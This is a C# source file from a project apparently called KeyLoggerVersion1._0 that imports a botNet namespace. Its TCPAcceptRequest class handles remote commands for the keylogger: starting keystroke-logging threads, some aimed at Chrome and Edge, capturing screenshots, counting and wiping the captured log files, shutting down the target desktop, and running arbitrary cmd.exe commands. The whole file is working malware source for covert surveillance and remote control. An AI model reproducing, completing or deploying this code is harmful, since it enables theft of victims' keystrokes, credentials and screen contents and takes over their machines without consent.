using KeyLoggerVersion1._0.botNet;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLoggerVersion1._0.Network
{
    class TCPAcceptRequest
    {
        private static TCPAcceptRequest _Instance;

        public static TCPAcceptRequest Instance
        {
            get
            {
                if (_Instance == null)
                {
                    _Instance = new TCPAcceptRequest();
                }
                return _Instance;
            }
            private set
            {

            }
        }
        public TCPAcceptRequest() { }

        public void p_ErrorDataReceived(object sender, DataReceivedEventArgs e)
        {
            Process p = sender as Process;
            if (p == null)
                return;
            Console.WriteLine(e.Data);
        }

        public void p_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            Process p = sender as Process;
            if (p == null)
                return;
            Console.WriteLine(e.Data);
        }
        public void AcceptRequestServer(string request)
        {
            switch (request)
            {
                case "keylog -a":
                    {
                        try
                        {
                            TargetDesktop.Instance.RunThread("a");
                        }
                        catch (Exception a)
                        {
                            a.ToString();
                        }
                    }
                    break;
                case "keylog -kill":
                    {
                        try
                        {
                            TargetDesktop.Instance.thread.Abort();
                            TargetDesktop.Instance.thread1.Abort();
                            TargetDesktop.Instance.thread2.Abort();
                            TargetDesktop.Instance.threadEdge.Abort();
                            TargetDesktop.Instance.threadChrome.Abort();
                        }
                        catch(Exception kill)
                        {
                            kill.ToString();
                        }
                    }
                    break;
                case "keylog -s":
                    {
                        try
                        {
                            TargetDesktop.Instance.RunThread("s");
                        }
                        catch (Exception s)
                        {
                            s.ToString();
                        }
                    }
                    break;
                case "keylog -s1":
                    {
                        try
                        {
                            TargetDesktop.Instance.RunThread("s1");
                        }
                        catch (Exception b)
                        {
                            b.ToString();
                        }
                    }
                    break;
                case "keylog -s2":
                    {
                        try
                        {
                            TargetDesktop.Instance.RunThread("s2");
                        }
                        catch (Exception c)
                        {
                            c.ToString();
                        }
                    }
                    break;
                case "keylog -s3":
                    {
                        try
                        {
                            TargetDesktop.Instance.RunThread("s3");
                        }
                        catch (Exception d)
                        {
                            d.ToString();
                        }
                    }
                    break;
                case "keylog -t":
                    {
                        try
                        {
                            TargetDesktop.Instance.StartTimer(5000);
                        }
                        catch (Exception e)
                        {
                            e.ToString();
                        }
                    }
                    break;
                case "keylog -t0":
                    {
                        try
                        {
                            //TargetDesktop.Instance.StartTimer(0);
                            TargetDesktop.Instance.threadtime.Abort();
                        }
                        catch (Exception t0)
                        {
                            t0.ToString();
                        }
                    }
                    break;
                case "keylog -rb":
                    {
                        try
                        {
                            Console.WriteLine("|--------------------------------------------------------------------------------------------------|");
                            Console.WriteLine("|                                                                                                  |");
                            Console.WriteLine("|                                                                                                  |");
                            Console.WriteLine("|----------------------------------SHUT DOWN DESKTOP WITH COMMAND----------------------------------|");
                            Console.WriteLine("|                                                                                                  |");
                            Console.WriteLine("|                                                                                                  |");
                            Console.WriteLine("|--------------------------------------------------------------------------------------------------|");
                            string script = "";
                            do
                            {
                                Console.WriteLine();
                                Console.WriteLine("<<--- Typing /? to take list of fuction --->>");
                                Console.Write("ShutDownMainFunc: "); script = Console.ReadLine();
                                RebootOptionTargetDesktop.Instance.ScriptBashExitWindow(script);

                            } while (script != "do exit");
                        }
                        catch (Exception rb)
                        {
                            rb.ToString();
                        }
                    }
                    break;
                case "keylog -scrshot":
                    {
                        try
                        {
                            TakeScreenShot.Instance.CaptureAndSave(null, CaptureMode.Screen, null);
                        }
                        catch (Exception scrshot)
                        {
                            scrshot.ToString();
                        }
                    }
                    break;
                case "keylog -sendtxt":
                    {
                        try
                        {
                            DirectoryInfo info = new DirectoryInfo(API.SaveLogFileText.ToString());
                            FileInfo[] files = info.GetFiles("*.*");
                            int count = 0;
                            foreach (FileInfo f in files)
                            {
                                ++count;
                            }
                            Console.WriteLine("File storage in Directory: " + count);
                        }
                        catch (Exception sendtxt)
                        {
                            sendtxt.ToString();
                        }
                    }
                    break;
                case "keylog -sendpng":
                    {
                        try
                        {
                            DirectoryInfo info = new DirectoryInfo(API.SaveLogFileImage.ToString());
                            FileInfo[] files = info.GetFiles("*.png");
                            int count = 0;
                            foreach (FileInfo f in files)
                            {
                                ++count;
                            }
                            Console.WriteLine("Images storage in Directory: " + count);
                        }
                        catch (Exception sendpng)
                        {
                            sendpng.ToString();
                        }
                    }
                    break;
                case "keylog -cls":
                    {
                        try
                        {
                            if (Directory.Exists(API.SaveLogFileImage))
                            {
                                DirectoryInfo info = new DirectoryInfo(API.SaveLogFileImage.ToString());
                                FileInfo[] files = info.GetFiles("*.png");
                                foreach (FileInfo f in files)
                                {
                                    File.SetAttributes(f.FullName, FileAttributes.Normal);
                                    File.Delete(f.FullName);
                                }
                                Directory.Delete(API.SaveLogFileImage);
                            }
                            if (Directory.Exists(API.SaveLogFileText))
                            {
                                DirectoryInfo info = new DirectoryInfo(API.SaveLogFileText.ToString());
                                FileInfo[] files = info.GetFiles("*.*");
                                foreach (FileInfo f in files)
                                {
                                    File.SetAttributes(f.FullName, FileAttributes.Normal);
                                    File.Delete(f.FullName);
                                }
                                Directory.Delete(API.SaveLogFileText);
                            }

                        }
                        catch (Exception cls)
                        {
                            Console.WriteLine(cls.ToString());
                        }
                    }
                    break;
                case "keylog -cmd":
                    {
                        try
                        {
                            string input = "";
                            while (true)
                            {
                                Console.WriteLine();
                                Console.Write("Type you want execute: "); input = Console.ReadLine();
                                Console.WriteLine();
                                if (input == "exit" || input == "") break;
                                using (Process p = new Process())
                                {
                                    // set start info
                                    p.StartInfo = new ProcessStartInfo("cmd.exe")
                                    {
                                        RedirectStandardInput = true,
                                        UseShellExecute = false,
                                        WorkingDirectory = @"c:\"
                                    };
                                    // event handlers for output & error
                                    p.OutputDataReceived += p_OutputDataReceived;
                                    p.ErrorDataReceived += p_ErrorDataReceived;

                                    // start process
                                    p.Start();
                                    // send command to its input
                                    p.StandardInput.Write(input + p.StandardInput.NewLine);
                                    //wait
                                    //p.WaitForExit();
                                }
                            }
                        }
                        catch (Exception cmd)
                        {
                            Console.WriteLine(cmd.ToString());
                        }
                    }
                    break;
            }
        }
    }
}
